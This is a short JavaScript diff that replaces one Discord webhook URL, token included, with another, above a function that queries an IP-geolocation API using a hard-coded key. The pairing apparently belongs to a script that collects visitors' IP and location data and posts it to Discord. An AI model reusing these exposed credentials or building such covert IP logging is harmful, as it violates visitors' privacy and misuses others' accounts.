@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1262518500010889307/rhOGWxz2SdAF3j0-qq_JOd0teoqs8UDfl4gRfpNWvJ9bFl99qa0GV8iC4HpnFDX77Tsm";
+var webHookUrl = "https://discord.com/api/webhooks/1262427996849963170/iTjPWoR-pof3obglJVuWo7aqkbLAVIbBb4z1BFhA3mFjgH_PC7biRX7MDiXv9ioGCRH6";
 
 let request = async () => {
     let response = await fetch('https://api.ipdata.co/?api-key=2c3eec05908b1cb9de28f604b59185a418853af65c734900b902ed98');
